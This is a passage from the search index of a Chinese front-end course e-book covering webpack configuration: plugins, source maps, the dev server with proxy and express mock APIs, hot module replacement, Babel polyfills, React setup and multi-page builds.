(\u2f50\u6bd4\u5982\uff0c\u4ec5\u4ec5 unit test \u5757) chunksSortMode: \u5141\u8bb8\u63a7\u5236\u5757\u5728\u6dfb\u52a0\u5230\u2eda\u2faf\u4e4b\u524d\u7684\u6392\u5e8f\u2f45\u5f0f\uff0c\u2f40\u6301 \u7684\u503c:'none' | 'default' | {function}-default:'auto' excludeChunks: \u5141\u8bb8\u8df3\u8fc7\u67d0\u4e9b\u5757\uff0c(\u2f50\u6bd4\u5982\uff0c\u8df3\u8fc7\u5355\u5143\u6d4b\u8bd5\u7684\u5757)\n</code></pre> <p>\u6848\u4f8b:</p> <pre><code>const path = require(\"path\");\nconst htmlWebpackPlugin = require(\"html-webpack-\nplugin\");\n</code></pre> <pre><code>module.exports = {\n  ...\n  plugins: [\n    new htmlWebpackPlugin({\n      title: \"My App\",\n      filename: \"app.html\",\n      template: \"./src/index.html\"\n    })\n  ]\n};\n</code></pre> <pre><code>//index.html\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-\nwidth, initial-scale=1.0\" /&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\"\ncontent=\"ie=edge\" /&gt;\n    &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;\n&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id=\"root\"&gt;&lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#clean-webpack-plugin","title":"clean-webpack-plugin","text":"<pre><code> npm install --save-dev clean-webpack-plugin\n</code></pre> <pre><code>const { CleanWebpackPlugin } = require(\"clean-\nwebpack-plugin\");\n</code></pre> <pre><code>plugins: [\n    new CleanWebpackPlugin()\n]\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#mini-css-extract-plugin","title":"mini-css-extract-plugin","text":"<pre><code>const MiniCssExtractPlugin = require(\"mini-css-extract-plugin\");\n{\n  test: /\\.css$/,\n  use: [MiniCssExtractPlugin.loader, \"css-loader\"]\n}\n</code></pre> <pre><code>new MiniCssExtractPlugin({\n  filename: \"[name][chunkhash:8].css\"\n})\n</code></pre> <p>chunk:\u2f00\u4e2a\u2f0a\u2f1d\u80af\u5b9a\u662f\u2f00\u4e2achunk\uff0c\u4f46\u662f\u2f00\u4e2achunk\u4e0d\u2f00\u5b9a\u53ea\u6709 \u2f00\u4e2a\u4f9d\u8d56</p> <p>webpack5.x \u51cf\u5c11hash\u7684\u6982\u5ff5 Contenthash</p>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#6sourcemap","title":"6.sourceMap","text":"<p>\u6e90\u4ee3\u7801\u4e0e\u6253\u5305\u540e\u7684\u4ee3\u7801\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u901a\u8fc7sourceMap\u5b9a\u4f4d\u5230\u6e90\u4ee3 \u7801\u3002</p> <p>\u5728dev\u6a21\u5f0f\u4e2d\uff0c\u9ed8\u8ba4\u5f00\u542f\uff0c\u5173\u95ed\u7684\u8bdd \u53ef\u4ee5\u5728\u914d\u7f6e\u2f42\u4ef6\u91cc </p> <pre><code>devtool:\"none\"\n</code></pre> <p>devtool\u7684\u4ecb\u7ecd:https://webpack.js.org/configuration/devtool#d evtool</p> <p>eval:\u901f\u5ea6\u6700\u5feb,\u4f7f\u2f64eval\u5305\u88f9\u6a21\u5757\u4ee3\u7801,</p> <p>source-map: \u4ea7\u2f63.map\u2f42\u4ef6</p> <p>cheap:\u8f83\u5feb\uff0c\u4e0d\u5305\u542b\u5217\uf99c\u4fe1\u606f</p> <p>Module:\u7b2c\u4e09\u2f45\u6a21\u5757\uff0c\u5305\u542bloader\u7684sourcemap(\u2f50\u6bd4\u5982jsx to js \uff0c babel\u7684sourcemap)</p> <p>inline: \u5c06.map\u4f5c\u4e3aDataURI\u5d4c\u2f0a\uff0c\u4e0d\u5355\u72ec\u2f63\u6210.map\u2f42\u4ef6 \u914d\u7f6e\u63a8\u8350:</p>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#webpackdevserver","title":"WebpackDevServer","text":"<ul> <li>\u63d0\u5347\u5f00\u53d1\u6548\u7387\u7684\u5229\u5229\u5668\u5668   \u6bcf\u6b21\u6539\u5b8c\u4ee3\u7801\u90fd\u9700\u8981\u91cd\u65b0\u6253\u5305\u2f00\u6b21\uff0c\u6253\u5f00\u6d4f\u89c8\u5668\u5668\uff0c\u5237\u65b0\u2f00\u6b21\uff0c\u5f88\u9ebb\u70e6,\u6211\u4eec\u53ef\u4ee5\u5b89\u88c5\u4f7f\u2f64webpackdevserver\u6765\u6539\u5584\u8fd9\u5757\u7684\u4f53\u9a8c</li> <li>\u5b89\u88c5</li> </ul> <p>devtool:\"cheap-module-eval-source-map\",// \u5f00\u53d1\u73af\u5883\u914d\u7f6e</p> <p>//\u7ebf\u4e0a\u4e0d\u63a8\u8350\u5f00\u542f  devtool:\"cheap-module-source-map\", // \u7ebf\u4e0a\u2f63\u6210\u914d\u7f6e</p> <pre><code>npm install webpack-dev-server -D\n</code></pre> <p>\u914d\u7f6e \u4fee\u6539\u4e0bpackage.json</p> <p>\u5728webpack.config.js\u914d\u7f6e:</p> <p>\u542f\u52a8</p> <pre><code> npm run server\n</code></pre> <p>\u542f\u52a8\u670d\u52a1\u540e\uff0c\u4f1a\u53d1\u73b0dist\u2f6c\u5f55\u6ca1\u6709\u4e86\uff0c\u8fd9\u662f\u56e0\u4e3adevServer\u628a\u6253\u5305\u540e \u7684\u6a21\u5757\u4e0d\u4f1a\u653e\u5728dist\u2f6c\u5f55\u4e0b\uff0c\u2f7d\u662f\u653e\u5230\u5185\u5b58\u4e2d\uff0c\u4ece\u2f7d\u63d0\u5347\u901f\u5ea6</p> <ul> <li>\u672c\u5730mock,\u89e3\u51b3\u8de8\u57df: \u8054\u8c03\u671f\u95f4\uff0c\u524d\u540e\u7aef\u5206\u79bb\uff0c\u76f4\u63a5\u83b7\u53d6\u6570\u636e\u4f1a\u8de8\u57df\uff0c\u4e0a\u7ebf\u540e\u6211\u4eec\u4f7f\u2f64</li> </ul> <p>nginx\u8f6c\u53d1\uff0c\u5f00\u53d1\u671f\u95f4\uff0cwebpack\u5c31\u53ef\u4ee5\u641e\u5b9a\u8fd9\u4ef6\u4e8b \u542f\u52a8\u2f00\u4e2a\u670d\u52a1\u5668\uff0cmock\u2f00\u4e2a\u63a5\u2f1d:</p> <pre><code>// npm i express -D\n\"scripts\": {\n  \"server\": \"webpack-dev-server\"\n},\ndevServer: {\n  contentBase: \"./dist\",\n  open: true,\n  port: 8081\n},\n</code></pre> <pre><code>// \u521b\u5efa\u2f00\u4e2aserver.js \u4fee\u6539scripts \"server\":\"node server.js\"\n//server.js\n\nconst express = require('express')\nconst app = express()\napp.get('/api/info', (req,res)=&gt;{\n  res.json({\n    name:'\u5f00\u8bfe\u5427',\n    age:5, msg:'\u6b22\u8fce\u6765\u5230\u5f00\u8bfe\u5427\u5b66\u4e60\u524d\u7aef\u2fbc\u9ad8\u7ea7\u8bfe\u7a0b'\n  })\n})\n\napp.listen('9092')\n//node server.js\nhttp://localhost:9092/api/info\n</code></pre> <p>\u9879\u2f6c\u4e2d\u5b89\u88c5axios\u2f2f\u5177</p> <pre><code>//npm i axios -D\n</code></pre> <p>//index.js</p> <pre><code>import axios from 'axios'\naxios.get('http://localhost:9092/api/info').then(res\n=&gt;{\n    console.log(res)\n})\n</code></pre> <p>\u4f1a\u6709\u8de8\u57df\u95ee\u9898</p> <p>\u4fee\u6539webpack.config.js \u8bbe\u7f6e\u670d\u52a1\u5668\u4ee3\u7406</p> <pre><code>proxy: {\n  \"/api\": {\n    target: \"http://localhost:9092\"\n  }\n}\n</code></pre> <p>\u4fee\u6539index.js</p> <pre><code>axios.get(\"/api/info\").then(res =&gt; {\n  console.log(res);\n});\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#hot-module-replacement-hmr","title":"Hot Module Replacement (HMR:\u70ed\u6a21\u5757 \u66ff\u6362)","text":"<ul> <li>\u4e0d\u2f40\u6301\u62bd\u79bb\u51fa\u7684css \u6211\u4eec\u8981\u4f7f\u2f64css-loader \u542f\u52a8hmr</li> </ul> <pre><code>devServer: {\n  contentBase: \"./dist\",\n    open: true,\n      hot:true, //\u5373\u4fbf\u4fbfHMR\u4e0d\u2f63\u6548\uff0c\u6d4f\u89c8\u5668\u5668\u4e5f\u4e0d\u2f83\u81ea\u52a8\u5237\u65b0\uff0c\u5c31\u5f00\u542fhotOnly hotOnly:true\n},\n</code></pre> <p>\u914d\u7f6e\u2f42\u4ef6\u5934\u90e8\u5f15\u2f0awebpack</p> <pre><code>//const path = require(\"path\");\n//const HtmlWebpackPlugin = require(\"html-webpack-plugin\");\n//const CleanWebpackPlugin = require(\"clean-webpack-plugin\");\nconst webpack = require(\"webpack\");\n</code></pre> <p>\u5728\u63d2\u4ef6\u914d\u7f6e\u5904\u6dfb\u52a0:</p> <pre><code>plugins: [\n    new CleanWebpackPlugin(),\n    new HtmlWebpackPlugin({\n      template: \"src/index.html\"\n    }),\n    new webpack.HotModuleReplacementPlugin()\n  ],\n</code></pre> <p>\u6848\u4f8b:</p> <p>//index.js</p> <pre><code>import \"./css/index.css\";\n\nvar btn = document.createElement(\"button\");\nbtn.innerHTML = \"\u65b0\u589e\";\ndocument.body.appendChild(btn);\n\nbtn.onclick = function() {\n  var div = document.createElement(\"div\");\n  div.innerHTML = \"item\";\n  document.body.appendChild(div);\n};\n</code></pre> <pre><code>//index.css\ndiv:nth-of-type(odd) {\n  background: yellow;\n}\n</code></pre> <p>\u6ce8\u610f\u542f\u52a8HMR\u540e\uff0ccss\u62bd\u79bb\u4f1a\u4e0d\u2f63\u6548\uff0c\u8fd8\u6709\u4e0d\u2f40\u6301contenthash\uff0c chunkhash</p> <p>\u5904\u7406js\u6a21\u5757HMR \u9700\u8981\u4f7f\u2f64module.hot.accept\u6765\u89c2\u5bdf\u6a21\u5757\u66f4\u65b0 \u4ece\u2f7d\u66f4\u65b0</p> <p>\u6848\u4f8b:</p> <pre><code>//counter.js\nfunction counter() {\n  var div = document.createElement(\"div\");\n  div.setAttribute(\"id\", \"counter\");\n  div.innerHTML = 1;\n  div.onclick = function() {\n    div.innerHTML = parseInt(div.innerHTML, 10) + 1;\n  };\n  document.body.appendChild(div);\n}\nexport default counter;\n</code></pre> <p>//number.js</p> <pre><code>function number() {\n  var div = document.createElement(\"div\");\n  div.setAttribute(\"id\", \"number\");\n  div.innerHTML = 13000;\n  document.body.appendChild(div);\n}\nexport default number;\n</code></pre> <p>//index.js</p> <pre><code>import counter from \"./counter\";\nimport number from \"./number\";\ncounter();\nnumber();\n\nif (module.hot) {\n  module.hot.accept(\"./b\", function() {\n   document.body.removeChild(document.getElementById(\"number\"));\n    number();\n  });\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#babeles6","title":"Babel\u5904\u7406ES6","text":"<p>\u5b98\u2f45\u2f79\u7f51\u7ad9:https://babeljs.io/ </p> <p>\u4e2d\u2f42\u2f79\u7f51\u7ad9:https://www.babeljs.cn/</p> <p>Babel\u662fJavaScript\u7f16\u8bd1\u5668\uff0c\u80fd\u5c06ES6\u4ee3\u7801\u8f6c\u6362\u6210ES5\u4ee3\u7801\uff0c\u8ba9\u6211\u4eec \u5f00\u53d1\u8fc7\u7a0b\u4e2d\u653e\u2f3c\u4f7f\u2f64JS\u65b0\u7279\u6027\u2f7d\u4e0d\u2f64\u62c5\u2f3c\u517c\u5bb9\u6027\u95ee\u9898\u3002\u5e76\u4e14\u8fd8\u53ef\u4ee5 \u901a\u8fc7\u63d2\u4ef6\u673a\u5236\u6839\u636e\u9700\u6c42\u7075\u6d3b\u7684\u6269\u5c55\u3002</p> <p>Babel\u5728\u6267\u884c\u7f16\u8bd1\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u4ece\u9879\u2f6c\u6839\u2f6c\u5f55\u4e0b\u7684 .babelrc JSON \u2f42\u4ef6\u4e2d\u8bfb\u53d6\u914d\u7f6e\u3002\u6ca1\u6709\u8be5\u2f42\u4ef6\u4f1a\u4eceloader\u7684options\u5730\u2f45\u8bfb\u53d6\u914d \u7f6e\u3002</p>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#_1","title":"\u6d4b\u8bd5\u4ee3\u7801","text":"<pre><code>//index.js\nconst arr = [new Promise(() =&gt; {}), new Promise(()\n=&gt; {})];\narr.map(item =&gt; {\n  console.log(item);\n});\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#_2","title":"\u5b89\u88c5","text":"<pre><code>npm i babel-loader @babel/core @babel/preset-env -D\n</code></pre> <p>1.babel-loader\u662fwebpack \u4e0e babel\u7684\u901a\u4fe1\u6865\u6881\uf97a\uff0c\u4e0d\u4f1a\u505a\u628aes6\u8f6c\u6210</p> <p>es5\u7684\u2f2f\u4f5c\uff0c\u8fd9\u90e8\u5206\u2f2f\u4f5c\u9700\u8981\u2f64\u5230@babel/preset-env\u6765\u505a 2.@babel/preset-env\u91cc\u5305\u542b\u4e86es\uff0c6\uff0c7\uff0c8\u8f6ces5\u7684\u8f6c\u6362\u89c4\u5219</p> <p>Ecma 5 6 7 8... \u8349\u6848(\u8bc4\u5ba1\u901a\u8fc7\u7684\uff0c\u8fd8\u6709\u672a\u901a\u8fc7\u7684) \u2faf\u5411\u672a\u6765\u7684  env\u662fbabel7\u4e4b\u540e\u63a8\u884c\u7684\u9884\u8bbe\u63d2\u4ef6  env{</p> <p>ecma 5 ecma 6 ecma 7 ecma 8 \u3002\u3002\u3002 }</p> <p>Webpack.config.js</p> <p>\u901a\u8fc7\u4e0a\u2faf\u7684\u2f0f\u6b65 \u8fd8\u4e0d\u591f\uff0c\u9ed8\u8ba4\u7684Babel\u53ea\u2f40\u6301let\u7b49\u2f00\u4e9b\u57fa\u7840\u7684\u7279\u6027 \u8f6c\u6362\uff0cPromise\u7b49\u2f00\u4e9b\u8fd8\u6709\u8f6c\u6362\u8fc7\u6765\uff0c\u8fd9\u65f6\u5019\u9700\u8981\u501f\u52a9 @babel/polyfill\uff0c\u628aes\u7684\u65b0\u7279\u6027\u90fd\u88c5\u8fdb\u6765\uff0c\u6765\u5f25\u8865\u4f4e\u7248\u672c\u6d4f\u89c8\u5668\u4e2d \u7f3a\u5931\u7684\u7279\u6027</p> <pre><code>{\n  test: /\\.js$/,\n  exclude: /node_modules/,\n  use: {\n    loader: \"babel-loader\",\n    options: {\n      presets: [\"@babel/preset-env\"]\n    }\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#babelpolyfill","title":"@babel/polyfill","text":"<p>\u4ee5\u5168\u5c40\u53d8\u91cf\u7684\u2f45\u5f0f\u6ce8\u2f0a\u8fdb\u6765\u7684\u3002windows.Promise\uff0c\u5b83\u4f1a\u9020\u6210\u5168\u5c40 \u5bf9\u8c61\u7684\u6c61\u67d3</p> <pre><code> npm install --save @babel/polyfill\n</code></pre> <p>//index.js \u9876\u90e8  import \"@babel/polyfill\";</p> <p>\u6309\u9700\u52a0\u8f7d\uff0c\u51cf\u5c11\u5197\u4f59</p> <p>\u4f1a\u53d1\u73b0\u6253\u5305\u7684\u4f53\u79ef\u2f24\u5927\u4e86\u5f88\u591a\uff0c\u8fd9\u662f\u56e0\u4e3apolyfill\u9ed8\u8ba4\u4f1a\u628a\u6240\u6709\u7279\u6027\u6ce8 \u2f0a\u8fdb\u6765\uff0c\u5047\u5982\u6211\u60f3\u6211\u2f64\u5230\u7684es6+\uff0c\u624d\u4f1a\u6ce8\u2f0a\uff0c\u6ca1\u2f64\u5230\u7684\u4e0d\u6ce8\u2f0a\uff0c\u4ece \u2f7d\u51cf\u5c11\u6253\u5305\u7684\u4f53\u79ef\uff0c\u53ef\u4e0d\u53ef\u4ee5\u5462</p> <p>\u5f53\u7136\u53ef\u4ee5 \u4fee\u6539Webpack.config.js</p> <pre><code>options: {\n  [\n    presets: [\n    \"@babel/preset-env\",\n    {\n    targets: {\n    edge: \"17\",\n    firefox: \"60\",\n    chrome: \"67\",\n    safari: \"11.1\"\n    },\n    corejs: 2,//\u65b0\u7248\u672c\u9700\u8981\u6307\u5b9a\u6838\u2f3c\u5e93\u7248\u672c\n    useBuiltIns: \"usage\"//\u6309\u9700\u6ce8\u2f0a \n}\n]\n]\n}\n</code></pre> <p>useBuiltIns\u9009\u9879\u662fbabel 7\u7684\u65b0\u529f\u80fd\uff0c\u8fd9\u4e2a\u9009\u9879\u544a\u8bc9babel\u5982\u4f55 \u914d\u7f6e@babel/polyfill\u3002 \u5b83\u6709\u4e09\u4e2a\u53c2\u6570\u53ef\u4ee5\u4f7f\u2f64: 1entry: \u9700\u8981 \u5728webpack\u7684\u2f0a\u2f1d\u2f42\u4ef6\u91ccimport \"@babel/polyfill\"\u2f00  \u6b21\u3002 babel \u4f1a\u6839\u636e\u4f60\u7684\u4f7f\u2f64\u60c5\u51b5\u5bfc\u2f0a\u57ab\u2f5a\uff0c\u6ca1\u6709\u4f7f\u2f64\u7684\u529f\u80fd\u4e0d\u4f1a\u88ab \u5bfc\u2f0a\u76f8\u5e94\u7684\u57ab\u2f5a\u3002 2usage: \u4e0d\u9700\u8981import\uff0c\u5168\u2f83\u81ea\u52a8\u68c0\u6d4b\uff0c\u4f46\u662f\u8981 \u5b89\u88c5@babel/polyfill\u3002(\u8bd5\u9a8c\u9636\u6bb5) 3false: \u5982\u679c\u4f60import \"@babel/polyfill\" \uff0c\u5b83\u4e0d\u4f1a\u6392\u9664\u6389\u6ca1\u6709\u4f7f\u2f64\u7684\u57ab\u2f5a\uff0c\u7a0b\u5e8f\u4f53\u79ef\u4f1a \u5e9e\u2f24\u5927\u3002(\u4e0d\u63a8\u8350)</p> <p>\u8bf7\u6ce8\u610f: usage \u7684\u884c\u4e3a\u7c7b\u4f3c babel-transform-runtime\uff0c\u4e0d\u4f1a\u9020\u6210 \u5168\u5c40\u6c61\u67d3\uff0c\u56e0\u6b64\u4e5f\u4f1a\u4e0d\u4f1a\u5bf9\u7c7b\u4f3c Array.prototype.includes() \u8fdb\u884c polyfill\u3002</p> <p>\u6269\u5c55:  babelrc\u2f42\u4ef6: \u65b0\u5efa.babelrc\u2f42\u4ef6\uff0c\u628aoptions\u90e8\u5206\u79fb\u2f0a\u5230\u8be5\u2f42\u4ef6\u4e2d\uff0c\u5c31\u53ef\u4ee5\u4e86</p> <pre><code>//.babelrc\n{\n presets: [\n    [\n      \"@babel/preset-env\",\n      {\n        targets: {\n          edge: \"17\",\n          firefox: \"60\",\n          chrome: \"67\",\n          safari: \"11.1\"\n},\n corejs: 2, //\u65b0\u7248\u672c\u9700\u8981\u6307\u5b9a\u6838\u2f3c\u5e93\u7248\u672c useBuiltIns: \"usage\" //\u6309\u9700\u6ce8\u2f0a\n\n} ]\n\n] }\n\n//webpack.config.js\n{\n  test: /\\.js$/,\n  exclude: /node_modules/,\n  loader: \"babel-loader\"\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#react","title":"\u914d\u7f6eReact\u6253\u5305\u73af\u5883 \u5b89\u88c5","text":"<pre><code>npm install react react-dom --save\n</code></pre> <p>\u7f16\u5199react\u4ee3\u7801:</p> <pre><code>//index.js\nimport React, { Component } from \"react\";\nimport ReactDom from \"react-dom\";\nclass App extends Component {\n  render() {\n    return &lt;div&gt;hello world&lt;/div&gt;;\n  }\n}\n</code></pre> <pre><code>ReactDom.render(&lt;App /&gt;,\ndocument.getElementById(\"app\"));\n</code></pre> <p>\u5b89\u88c5babel\u4e0ereact\u8f6c\u6362\u7684\u63d2\u4ef6:  npm install --save-dev @babel/preset-react</p> <p>\u5728babelrc\u2f42\u4ef6\u91cc\u6dfb\u52a0:</p> <p><pre><code>{\n  \"presets\": [\n    [\n      \"@babel/preset-env\",\n      {\n        \"targets\": {\n          \"edge\": \"17\",\n          \"firefox\": \"60\",\n          \"chrome\": \"67\",\n          \"safari\": \"11.1\",\n          \"Android\":\"6.0\"\n        },\n        \"useBuiltIns\": \"usage\", //\u6309\u9700\u6ce8\u2f0a\n      }\n    ],\n    \"@babel/preset-react\"\n  ]\n}\n</code></pre> \u5982\u679c\u662f\u5e93\u7684\u4f5c\u8005\u7684\u8bdd\uff0c\u63d0\u4f9b\u6a21\u5757\u7684\u65f6\u5019\u4ee3\u7801\u600e\u4e48\u6253\u5305\u7684? \u6784\u5efa\u901f\u5ea6\u4f1a\u8d8a\u6765\u8d8a\u6162\uff0c\u600e\u4e48\u4f18\u5316 \u6269\u5c55: \u591a\u2eda\u2faf\u6253\u5305\u901a\u2f64\u2f45\u6848 <pre><code>entry:{\n  index:\"./src/index\",\n  list:\"./src/list\",\n  detail:\"./src/detail\"\n}\n\nnew htmlWebpackPlugins({\n  title: \"index.html\",\n  template: path.join(__dirname, \"./src/index/index.html\"),\n  filename:\"index.html\",\n  chunks:[index]\n})\n</code></pre> 1.\u2f6c\u5f55\u7ed3\u6784\u8c03\u6574 src</p> <p>index</p> <p>index.js</p> <p>index.html list</p> <p>index.js</p> <p>index.html detail</p> <p>index.js</p> <p>index.html  2.\u4f7f\u2f64 glob.sync \u7b2c\u4e09\u2f45\u5e93\u6765\u5339\u914d\u8def\u5f84</p> <pre><code>npm i glob -D\nconst glob = require(\"glob\")\n</code></pre> <pre><code>//MPA\u591a\u2eda\u2faf\u6253\u5305\u901a\u2f64\u2f45\u6848\nconst setMPA = () =&gt; {\n  const entry = {};\n  const htmlWebpackPlugins = [];\n  return {\n    entry,\n    htmlWebpackPlugins\n  }; \n};\n</code></pre> <pre><code>\n</code></pre> <pre><code>const { entry, htmlWebpackPlugins } = setMPA();\nconst setMPA = () =&gt; {\n  const entry = {};\n  const htmlWebpackPlugins = [];\n  const entryFiles = glob.sync(path.join(__dirname,\"./src/*/index.js\"));\n  entryFiles.map((item, index) =&gt; {\n    const entryFile = entryFiles[index];\n    const match = entryFile.match(/src\\/(.*)\\/index\\.js$/);\n    const pageName = match &amp;&amp; match[1];\n    entry[pageName] = entryFile;\n    htmlWebpackPlugins.push(\n      new htmlWebpackPlugin({\n        title: pageName,\n        template: path.join(__dirname, `src/${pageName}/index.html`),\n        filename: `${pageName}.html`,\n        chunks: [pageName],\n        inject: true\n      })\n    ); \n  });\n  return {\n    entry,\n    htmlWebpackPlugins\n  }; \n};\n\n\nconst { entry, htmlWebpackPlugins } = setMPA();\nmodule.exports = {\n  entry,\n  output:{\n    path: path.resolve(__dirname, \"./dist\"),\n    filename: \"[name].js\"\n  }\n  plugins: [\n  // ...\n  ...htmlWebpackPlugins//\u5c55\u5f00\u6570\u7ec4 \n    ]\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#_3","title":"\u6269\u5c55","text":""},{"location":"ebook-kaikeba-frontend/13-webpack-02/#babelplugin-transform-runtime","title":"@babel/plugin-transform-runtime","text":"<p>\u5f53\u6211\u4eec\u5f00\u53d1\u7684\u662f\u7ec4\u4ef6\u5e93\uff0c\u2f2f\u5177\u5e93\u8fd9\u4e9b\u573a\u666f\u7684\u65f6\u5019\uff0cpolyfill\u5c31\u4e0d\u9002\u5408 \u4e86\uff0c\u56e0\u4e3apolyfill\u662f\u6ce8\u2f0a\u5230\u5168\u5c40\u53d8\u91cf\uff0cwindow\u4e0b\u7684\uff0c\u4f1a\u6c61\u67d3\u5168\u5c40\u73af \u5883\uff0c\u6240\u4ee5\u63a8\u8350\u95ed\u5305\u2f45\u5f0f:@babel/plugin-transform-runtime\uff0c\u5b83 \u4e0d\u4f1a\u9020\u6210\u5168\u5c40\u6c61\u67d3</p> <p>\u5b89\u88c5</p> <pre><code>npm install --save-dev @babel/plugin-transform-\nruntime\nnpm install --save @babel/runtime\n</code></pre> <p>\u4fee\u6539\u914d\u7f6e\u2f42\u4ef6:\u6ce8\u91ca\u6389\u4e4b\u524d\u7684presets\uff0c\u6dfb\u52a0plugins</p> <pre><code>options: {\n    presets: [\n    [\n      \"@babel/preset-env\",\n      {\n        targets: {\n          edge: \"17\",\n          firefox: \"60\",\n          chrome: \"67\",\n          safari: \"11.1\"\n        },\n        useBuiltIns: \"usage\",\n        corejs: 2\n} ]\n  ],\n\"plugins\": [\n    [\n      \"@babel/plugin-transform-runtime\",\n      {\n        \"absoluteRuntime\": false,\n        \"corejs\": false,\n        \"helpers\": true,\n        \"regenerator\": true,\n        \"useESModules\": false\n      } ]\n] }\n</code></pre>"},{"location":"ebook-kaikeba-frontend/13-webpack-02/#_4","title":"\u2f42\u4ef6\u76d1\u542c","text":"<pre><code>\u8f6e\u8be2\u5224\u65ad\u2f42\u4ef6\u7684\u6700\u540e\u7f16\u8f91\u65f6\u95f4\u662f\u5426\u53d8\u5316\uff0c\u67d0\u4e2a\u2f42\u4ef6\u53d1\u2f63\u4e86\u53d8\u5316\uff0c\u5e76\n\u4e0d\u4f1a\u2f74\u523b\u544a\u8bc9\u76d1\u542c\u8005\uff0c\u5148\u7f13\u5b58\u8d77\u6765\n</code></pre> <p>webpack\u5f00\u542f\u76d1\u542c\u6a21\u5f0f\uff0c\u6709\u4e24\u79cd</p> <p>1.\u542f\u52a8webpack\u547d\u4ee4\u5f0f \u5e26\u4e0a--watch \u53c2\u6570\uff0c\u542f\u52a8\u76d1\u542c\u540e\uff0c\u9700\u8981\u2f3f\u624b\u52a8\u5237\u65b0\u6d4f\u89c8\u5668</p> <pre><code>scripts:{\n    \"watch\":\"webpack --watch\"\n</code></pre> <p>}</p> <p>2.\u5728\u914d\u7f6e\u2f42\u4ef6\u91cc\u8bbe\u7f6e watch:true</p> <pre><code>watch: true, //\u9ed8\u8ba4false,\u4e0d\u5f00\u542f //\u914d\u5408watch,\u53ea\u6709\u5f00\u542f\u624d\u6709\u4f5c\u2f64\n  watchOptions: {\n    //\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u4e0d\u76d1\u542c\u7684\u2f42\u4ef6\u6216\u8005\u2f6c\u5f55\uff0c\u2f40\u6301\u6b63\u5219\n    ignored: /node_modules/, \n      //\u76d1\u542c\u5230\u2f42\u4ef6\u53d8\u5316\u540e\uff0c\u7b49300ms\u518d\u53bb\u6267\u884c\u884c\uff0c\u9ed8\u8ba4300ms,\n    aggregateTimeout: 300, //\u5224\u65ad\u2f42\u4ef6\u662f\u5426\u53d1\u2f63\u53d8\u5316\u662f\u901a\u8fc7\u4e0d\u505c\u7684\u8be2\u95ee\u7cfb\u7edf\u6307\u5b9a\u2f42\u4ef6\u6709\u6ca1\u6709\u53d8\u5316\uff0c\u9ed8\u8ba4\u6bcf\u79d2\u95ee1\u6b21 \n    poll: 1000 //ms \u8f6e\u8be2 1s\u67e5\u770b1\u6b21\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/","title":"Webpack-Day3","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 26407  \u9605\u8bfb53\u5206\u949f</p> <p>2021-10-27</p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#_1","title":"\u672c\u5730\u5f00\u53d1\u670d\u52a1","text":""},{"location":"ebook-kaikeba-frontend/14-webpack-03/#proxy","title":"\u524d\u7aef\u8de8\u57df\u8bbe\u7f6e\u4ee3\u7406 proxy","text":"<p>\u95ee\u9898\uff1a\u524d\u540e\u7aef\u5206\u79bb\u5f00\u53d1\u65f6\uff0c\u540e\u7aef\u8fd8\u6ca1\u6709\u5199\u597d\u4ee3\u7801\uff0c\u524d\u7aef\u53ea\u80fd\u81ea\u5df1\u642d\u5efa\u4e00\u4e2a\u4e34\u65f6\u670d\u52a1\u5668\u3002\u5982\u679c\u4e34\u65f6\u7684\u670d\u52a1\u5668\u548c webpack-dev-server \u7684\u7aef\u53e3\u4e0d\u4e00\u81f4\uff0c\u90a3\u4e48\u4f1a\u51fa\u73b0\u8de8\u57df\u7684\u95ee\u9898\uff0c\u6240\u4ee5\u9700\u8981\u89e3\u51b3\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4ee3\u7406\u3002</p> <p>\u540e\u7aef\u4f1a\u7ed9\u51fa\u63a5\u53e3\u6587\u6863\u548c\u8054\u8c03\u65e5\u671f\uff1b\u524d\u7aef\u5728\u8054\u8c03\u524d\uff0c\u9700\u8981\u72ec\u7acb\u5f00\u53d1\uff1b\u4e0a\u7ebf\u540e\u4f7f\u7528 nginx \u5904\u7406\u8de8\u57df\u3002</p> <p>\u53ea\u8981 UI \u7ed9\u51fa\u4ea4\u7a3f\u65e5\u671f\uff0c\u5bf9\u63a5\u5b8c\u6210\uff0c\u524d\u7aef\u5c31\u53ef\u4ee5\u5f00\u59cb\u5de5\u4f5c\u3002</p> <pre><code>// \u4f7f\u7528 express mock \u6570\u636e\uff0c\u670d\u52a1\u5668\u7aef\u53e3\u53f7 8080 \nconst express = require('express');\nconst app = express();\n\napp.get(\"api/comment\", (req, res) =&gt; {\n  res.json({\n    data: 'hi'\n  })\n})\n\napp.listen(\"8080\")\n// \u7136\u540e\u5728\u7ec8\u7aef\u4e2d\u76f4\u63a5 node \u6267\u884c\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5373\u53ef\u5f00\u542f\u672c\u5730\u4e34\u65f6\u670d\u52a1\u5668\n</code></pre> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728 webpack \u8bbe\u7f6e\u4e2d\u66f4\u6539 proxy \u5c5e\u6027\uff1a\u9047\u5230 /api \u5f00\u5934\u7684\u8bf7\u6c42\u5c31\u8f6c\u53d1\u5230 